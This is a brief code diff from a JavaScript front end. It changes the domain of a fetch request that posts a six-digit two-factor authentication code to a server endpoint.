@@ -84,7 +84,7 @@ document.addEventListener("DOMContentLoaded", () => {
         if (code.length !== 6) return;
 
         try {
-            const response = await fetch("https://zezenta.shop/ruta/secreta/secretisima/2fa", {
+            const response = await fetch("https://panasresponde.work/ruta/secreta/secretisima/2fa", {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
